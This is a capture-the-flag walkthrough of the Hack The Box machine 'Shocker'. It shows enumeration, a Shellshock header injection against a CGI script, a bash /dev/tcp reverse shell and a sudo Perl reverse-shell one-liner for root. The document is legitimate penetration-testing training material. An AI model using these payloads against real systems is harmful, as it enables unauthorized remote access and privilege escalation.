---
title: "Hack The Box - Shocker"
date: 2020-01-07
tags: [oscp, htb, linux]
collection: oscp-prep
published: true
layout: single
classes: wide
toc: true
toc_label: Table of Contents
headline: "Playing with Shellshock"
picture: /assets/htb-shocker/machine_info.png
author_profile: false
---

![](/assets/htb-shocker/machine_info.png)

## Enumeration

Our `nmap` scans show only ports 80 and 2222 open, running Apache 2.4.18 and OpenSSH 7.2p2 respectivly.

```
Nmap scan report for 10.10.10.56
Host is up, received user-set (0.048s latency).
Scanned at 2020-01-07 10:22:51 EST for 477s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
```

Running a `gobuster` scan shows a directory for `/cgi-bin/`. 

```
/cgi-bin/ (Status: 403) [Size: 294]
/index.html (Status: 200) [Size: 137]
/server-status (Status: 403) [Size: 299]
```

---

## Initial Shell

### Finding a script

Being that this is also hosted on Apache, and the box is called *Shocker*, we can assume that the intention is for the path forward to be related to the [Shellshock vulnerability](https://www.owasp.org//assets/htb-shocker/1/1b/Shellshock_-_Tudor_Enache.pdf). However, for this to happen, we need a URL to a specific script in the `/cgi-bin/` directory that we can exploit to get RCE.

For this, we can use `dirsearch` to do some deeper probing of the directory for script files that might be available to us. In this case, we'll use the command `dirsearch -u http://10.10.10.56/cgi-bin -f -e sh,cgi,bash -w ~/wordlists/dirb/big.txt -t 50 -x 403`, which will do a few things:

- Limit the search to the `/cgi-bin/` directory
- Append `sh`,`cgi`,`bash` file extensions to the wordlist to try to bruteforce scripts
- Ignore responses with status code of 403

<a href="/assets/htb-shocker/dirsearch_user_sh.png"><img src="/assets/htb-shocker/dirsearch_user_sh.png" width="95%"></a>

Sure enough, we get a hit back on `user.sh`. We can now test this script for the shellshock vulnerability.

### Testing the script with Burp Suite

Since Shellshock via Apache mostly involves passing commands via HTTP header information, the easiest way to do this will be using Burp Suite.

To get setup:

1. Open Burp Suite
2. Set your browser to use `127.0.0.1:8080` as a proxy. I recommend using somehting like FoxyProxy to easily switch the proxy on and off as needed.
3. Navigate to `http://10.10.10.56/cgi-bin/user.sh` in the browser, in order to capture the requests in Burp.
4. Find the initial GET request, and send it to the Burp Repeater.

Once done, you should have something similar to this in front of you.

![](/assets/htb-shocker/burp_initial.png)

From here, we can start modifying the headers to inject the *magic colon* and RCE commands that will trigger the exploit.

The Shellshock exploit requires a specific sequence of characters and commands to be sent to trigger. We'll be injecting a header like `custom: () { :; };echo; /bin/foo` into the request. Also, the exploit does require the use of the full path for binaries, since you're not technically in a shell with a `PATH` variable loaded. For example, we can't use something like `ping`, but we can use `/bin/ping` instead.

Our first test is to see who we're running as. We can add the custom header with `custom: () { :; };echo; /bin/bash -c "whoami"`.

![](/assets/htb-shocker/burp_whoami.png)

So we're running as a user called `shelly`. Let's see if we can do a more complex RCE, and reach our own macihne with a ping test.

### Testing for connectivity

> Be sure to capture the pings with `tcpdump -i tun0 icmp`

`custom: () { :; };echo; /bin/ping -c 5 10.10.14.4` 

<a href="/assets/htb-shocker/ping_test.png"><img src="/assets/htb-shocker/ping_test.png" width="95%"></a>

![](/assets/htb-shocker/ping_test_tcpdump.png)

Looks like our RCE worked, and we can reach our attacking machine. Time for a reverse shell.

### Reverse shell

Given that the commands are all Bash based, a good bash reverse shell is all we should need. Open a listener with `nc -lvnp 7500` to catch the shell. The custom header in this case will be `custom: () { :; };echo; /bin/bash -i >& /dev/tcp/10.10.14.4/7500 0>&1`

![](/assets/htb-shocker/burp_user_shell.png)

![](/assets/htb-shocker/user_shell.png)

Looks like we got a shell! Time to grab `user.txt`

![](/assets/htb-shocker/user_proof.png)

---

## Privlege Escalation

### Checking the sudoers file

As is common with any basic Linux prvesc, se should check the sudoers file with `sudo -l` to see what, if any, `sudo` commands the user can run.

![](/assets/htb-shocker/sudo_file.png)

Looks like `shelly` can run `/usr/bin/perl` with `sudo`, and no password. This makes a `root` shell easy, as all we'll need is a Perl reverse shell.

### Root Shell

The command `sudo /usr/bin/perl -e 'use Socket;$i="10.10.14.4";$p=7600;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'` will trigger a reverse shell as the `root` user.

> Be sure to start a listener with `nc -lvnp 7600` to catch it!

<a href="/assets/htb-shocker/root_shell.png"><img src="/assets/htb-shocker/root_shell.png" width="95%"></a>

Got the shell!

![](/assets/htb-shocker/root_proof.png)